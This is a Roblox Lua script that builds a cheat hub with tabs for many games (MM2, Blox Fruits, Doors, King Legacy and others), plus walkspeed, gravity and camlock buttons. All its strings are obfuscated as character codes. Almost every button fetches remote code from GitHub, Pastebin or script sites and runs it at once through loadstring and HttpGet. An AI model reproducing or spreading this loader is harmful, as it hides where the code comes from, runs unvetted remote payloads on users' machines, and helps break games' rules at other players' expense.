function WnLvZbiekUoPjdkwjyYqoORZojUF(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


local player = game.Players.LocalPlayer
local Flux = loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,10500,10185,12495,11025,10500,4725,12075,10395,11970,11025,11760,12180,12075,4935,8925,7665,4725,7980,11025,10290,12075,4935,11445,10185,11025,11550,4935,10710,11340,12285,12600,11340,11025,10290,4830,12180,12600,12180})))()

local Window = Flux:Window(WnLvZbiekUoPjdkwjyYqoORZojUF({7350,11340,12285,12600,12285,12075,3360,9450,3360,8715,10395,11970,11025,11760,12180,10920,12285,10290,3360,9030,5355}), WnLvZbiekUoPjdkwjyYqoORZojUF({10500,11025,12075,10395,11655,11970,10500,4830,10815,10815,4935,10710,11340,12285,12600,12285,12075,12810}), Color3.fromRGB(255, 110, 48), Enum.KeyCode.RightControl)

-- Notification to confirm if FluxLib is loaded
Flux:Notification(WnLvZbiekUoPjdkwjyYqoORZojUF({9135,10605,11340,10395,11655,11445,10605,3465}), WnLvZbiekUoPjdkwjyYqoORZojUF({9135,10605,11340,10395,11655,11445,10605,3360,12180,11655,3360,7350,11340,12285,12600,12285,12075,3360,9450,3360,8400,11655,12495,10605,11970,10710,12285,11340,3360,8715,10395,11970,11025,11760,12180,10920,12285,10290,3465}))

-- Universal Scripts Tab
local UniversalTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({8925,11550,11025,12390,10605,11970,12075,10185,11340,3360,8715,10395,11970,11025,11760,12180,12075}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5775,5355,5460,5355,5880,5985,5250,5565,5355,5040,5670,5460,5040,5145}))

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7980,11655,10395,11235,3360,8295,11550,3360,4200,10185,11025,11445,10290,11655,12180,4305}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,12075,3360,7980,11655,10395,11235,3360,8295,11550}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,5880,11025,11550,10710,7455,7350,7035,5565})))()
end)

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({9135,10185,11340,11235,12075,11760,10605,10605,10500}), WnLvZbiekUoPjdkwjyYqoORZojUF({8715,10605,12180,12075,3360,9135,10185,11340,11235,12075,11760,10605,10605,10500,3360,12180,11655,3360,5565,5040}), function()
    player.Character.Humanoid.WalkSpeed = 50
end)

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7980,11655,12495,3360,7455,11970,10185,12390,11025,12180,12705}), WnLvZbiekUoPjdkwjyYqoORZojUF({8715,10605,12180,12075,3360,7455,11970,10185,12390,11025,12180,12705,3360,12180,11655,3360,5145,5040}), function()
    game.Workspace.Gravity = 10
end)

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7350,11340,12705,3360,9030,5355}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,7350,11340,12705,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,9240,8190,7245,8295,7350,7350,4935,7350,11340,12705,7455,12285,11025,9030,5355,4935,11445,10185,11025,11550,4935,7350,11340,12705,7455,12285,11025,9030,5355,4830,12180,12600,12180})))()
end)

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7350,10185,12180,10605,12075,3360,6825,10500,11445,11025,11550}), WnLvZbiekUoPjdkwjyYqoORZojUF({7980,11655,10185,10500,3360,7350,10185,12180,10605,12075,3360,6825,10500,11445,11025,11550,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,12075,10395,11970,11025,11760,12180,12075,4830,11550,10605,12180,4935,11970,10185,12495,4935,8925,11550,11025,12390,10605,11970,12075,10185,11340,4725,8715,10395,11970,11025,11760,12180,4725,7350,10185,12180,10605,12075,4725,6825,10500,11445,11025,11550,4725,5250,5355,5460,5250})))()
end)

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({8610,10605,12390,11025,12810,3360,6825,10500,11445,11025,11550}), WnLvZbiekUoPjdkwjyYqoORZojUF({7980,11655,10185,10500,3360,8610,10605,12390,11025,12810,3360,6825,10500,11445,11025,11550,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,12075,10395,11970,11025,11760,12180,12075,4830,11550,10605,12180,4935,11970,10185,12495,4935,8925,11550,11025,12390,10605,11970,12075,10185,11340,4725,8715,10395,11970,11025,11760,12180,4725,8610,10605,12390,11025,12810,4725,5355,5880,5460,5145})))()
end)

UniversalTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({8190,10185,11445,10605,11340,10605,12075,12075,3360,6825,10500,11445,11025,11550}), WnLvZbiekUoPjdkwjyYqoORZojUF({7980,11655,10185,10500,3360,8190,10185,11445,10605,11340,10605,12075,12075,3360,6825,10500,11445,11025,11550,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7350,11025,11340,12180,10605,11970,11025,11550,10815,7245,11550,10185,10290,11340,10605,10500,4935,8190,10185,11445,10605,11340,10605,12075,12075,6825,10500,11445,11025,11550,4935,11445,10185,11025,11550,4935,8715,11655,12285,11970,10395,10605})))()
end)

-- Additional Game-Specific Tabs
local MM2Tab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({8085,8085,5250,3360,8715,10395,11970,11025,11760,12180}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5145,5775,5460,5460,5775,5985,5565,5565,5355,5355,5775,5880,5460,5565}))
MM2Tab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({9555,8190,7245,9135,3465,4305,3360,8085,12285,11970,10500,10605,11970,3360,8085,12705,12075,12180,10605,11970,12705,3360,5250,3360,8715,10395,11970,11025,11760,12180,25200,16695,14910,13755,25200,16695,15540,17850}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,8085,8085,5250,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,6930,11025,11550,10815,12285,12075,9135,8610,4935,8610,11655,10290,11340,11655,12600,4725,8085,11445,5250,4725,8400,7035,4725,8085,11655,10290,11025,11340,10605,4725,8715,10395,11970,11025,11760,12180,4935,11445,10185,11025,11550,4935,8610,11655,10290,11340,11655,12600,4725,8085,11445,5250,4725,8400,7035,4725,8085,11655,10290,11025,11340,10605,4725,8715,10395,11970,11025,11760,12180})))()
end)

local PetsTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({9555,8190,7245,9135,9765,3360,8400,7245,8820,8715,3360,7455,8295,3465,25200,16695,14700,16695}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5460,5040,5355,5040,5565,5565,5250,5670,5985,5355,5355,5775,5250,5040}))
PetsTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({8400,10605,12180,12075,3360,10815,11655,3360,7875,10605,12705,11340,10605,12075,12075,3360,8400,11655,12495,10605,11970,10710,12285,11340,3360,8715,10395,11970,11025,11760,12180,4830,25200,16695,14700,16695}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,8400,10605,12180,12075,3360,7455,11655,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,12075,10395,11970,11025,11760,12180,12075,4830,11550,10605,12180,4935,11970,10185,12495,4935,8400,7245,8820,8715,4725,7455,8295,3465,4725,8190,7245,9135,4725,7455,11655,4725,12075,10395,11970,11025,11760,12180,4725,5250,5145,5355,5565,5250})))()
end)

local StrongestTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({8820,10920,10605,3360,8715,12180,11970,11655,11550,10815,10605,12075,12180,3360,6930,10185,12180,12180,11340,10605,10815,11970,11655,12285,11550,10500,12075}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5145,5670,5460,5040,5985,5880,5355,5775,5250,5250,5880,5250,5565,5880}))
StrongestTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({6930,10605,12075,12180,3360,8190,11655,3360,6930,10185,11550,3360,8715,10395,11970,11025,11760,12180,25200,16695,14700,16695,3360,9555,7875,7770,3465,3465,9765}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,8190,11655,3360,6930,10185,11550,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10605,11550,12180,11970,12705,4830,11655,11970,10815,4935,10185,11865,12285,10185,11970,11025,12285,12075,4725,10920,12285,10290,4935,11970,10185,12495})))()
end)

local SimTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({8400,10605,12180,3360,8715,11025,11445,12285,11340,10185,12180,11655,11970,3360,5985,5985}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5250,5040,5775,5775,5565,5985,5250,5985,5775,5670,5670,5985,5775,5040}))
SimTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({8400,7245,8820,3360,8715,7665,8085,8925,7980,6825,8820,8295,8610,3360,5985,5985,3360,8715,10395,11970,11025,11760,12180}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,8400,10605,12180,3360,8715,11025,11445,12285,11340,10185,12180,11655,11970,3360,5985,5985,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,12810,10185,11760,10920,12285,10290,4830,12600,12705,12810,4935,7245,12600,10605,10395})))()
end)

local BloxFruitsTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({6930,11340,11655,12600,3360,7350,11970,12285,11025,12180,12075}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5250,5460,5250,5145,5040,5565,5145,5565,5355,5985,5460,5985,5565,5775}))
BloxFruitsTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({6930,11340,11655,12600,3360,7350,11970,12285,11025,12180,12075,3360,8715,10395,11970,11025,11760,12180}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,6930,11340,11655,12600,3360,7350,11970,12285,11025,12180,12075,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7770,10185,10500,10605,11340,11340,12705,5250,5670,5145,4935,6930,11340,11655,12600,7350,11970,12285,11025,12180,12075,4935,11445,10185,11025,11550,4935,6825,12285,11970,11655,11970,10185}), true))()
end)

local KingLegacyTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({7875,11025,11550,10815,3360,7980,10605,10815,10185,10395,12705}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5775,5355,5775,5670,5775,5460,5040,5460,5775,5040,5985,5145,5145,5250}))
KingLegacyTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7875,7665,8190,7455,3360,7980,7245,7455,6825,7035,9345,3360,8715,10395,11970,11025,11760,12180}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,7875,11025,11550,10815,3360,7980,10605,10815,10185,10395,12705,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,12810,12285,12495,12810,4830,11445,10605,4935,7980,12075,4725,9450,10605,10605,4725,7560,12285,10290,4725,7875,7980})))()
end)

local BathroomTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({8400,12285,10290,11340,11025,10395,3360,6930,10185,12180,10920,11970,11655,11655,11445,3360,8715,11025,11445,12285,11340,10185,12180,11655,11970}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5040,5355,5670,5145,5355,5565,5040,5250,5985,5460,5460,5145,5250,5670}))
BathroomTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({6930,12285,10500,10815,11025,10605,3360,7560,12285,10290}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,6930,12285,10500,10815,11025,10605,3360,7560,12285,10290}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,12075,10395,11970,11025,11760,12180,12075,4830,11550,10605,12180,4935,11970,10185,12495,4935,8400,12285,10290,11340,11025,10395,4725,6930,10185,12180,10920,11970,11655,11655,11445,4725,8715,11025,11445,12285,11340,10185,12180,11655,11970,4725,6930,12285,10500,10815,11025,10605,4725,7560,12285,10290,4725,5145,5040,5670,5250,5145})))()
end)

local JujutsuTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({7770,12285,11130,12285,12180,12075,12285,3360,8715,10920,10605,11550,10185,10815,11025,10185,11550,12075}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5985,5775,5880,5985,5040,5460,5670,5985,5985,5145,5040,5565,5250,5565}))
JujutsuTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7245,12600,10605,10395,12285,12180,10605}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,7770,12285,11130,12285,12180,12075,12285,3360,8715,10920,10605,11550,10185,10815,11025,10185,11550,12075,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,8295,10920,10920,8085,12705,7455,10605,10920,11340,10605,10605,4935,5670,5565,5775,4935,11445,10185,11025,11550,4935,11235,11025,11340,11655})))()
end)
JujutsuTab:Label(WnLvZbiekUoPjdkwjyYqoORZojUF({7035,10185,12285,12180,11025,11655,11550,6090,3360,8190,11655,12180,3360,7875,10605,12705,11340,10605,12075,12075}))

local DoorsTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({7140,11655,11655,11970,12075}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5775,5565,5355,5775,5775,5355,5775,5145,5040,5985,5460,5040,5355,5775}))
DoorsTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7245,12600,10605,10395,12285,12180,10605}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,7140,11655,11655,11970,12075,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,12075,10395,11970,11025,11760,12180,12075,4830,11550,10605,12180,4935,11970,10185,12495,4935,7350,7980,8295,8295,8610,4725,5250,4725,7140,8295,8295,8610,8715,4725,8715,10605,11550,12075,10185,12180,11025,11655,11550,4725,9030,5250,4725,5250,5040,5145,5040,5565})))()
end)

local CamlockTab = Window:Tab(WnLvZbiekUoPjdkwjyYqoORZojUF({7035,10185,11445,11340,11655,10395,11235}), WnLvZbiekUoPjdkwjyYqoORZojUF({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5775,5040,5565,5985,5565,5250,5985,5040,5355,5775,5355,5145,5880,5985}))
CamlockTab:Button(WnLvZbiekUoPjdkwjyYqoORZojUF({7245,12600,10605,10395,12285,12180,10605,3465}), WnLvZbiekUoPjdkwjyYqoORZojUF({6825,10395,12180,11025,12390,10185,12180,10605,3360,7035,10185,11445,11340,11655,10395,11235,3360,8715,10395,11970,11025,11760,12180}), function()
    loadstring(game:HttpGet(WnLvZbiekUoPjdkwjyYqoORZojUF({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7455,11655,11655,10710,12705,6930,11340,11655,12600,4935,7350,11340,12285,12600,12285,12075,9450,4935,11970,10605,10710,12075,4935,10920,10605,10185,10500,12075,4935,11445,10185,11025,11550,4935,6930,10605,12075,12180,7035,10185,11445,11340,11655,10395,11235})))()
end)

-- Credits
UniversalTab:Label(WnLvZbiekUoPjdkwjyYqoORZojUF({7035,11970,10605,10500,11025,12180,12075,6090,3360,7350,11340,12285,12600,12285,12075,3360,9450,3360,7140,10605,12390,10605,11340,11655,11760,10605,11970,3360,11130,10920,10185,11445,10185,11025,3360,11655,11550,3360,10500,11025,12075,10395,11655,11970,10500,4830}))    
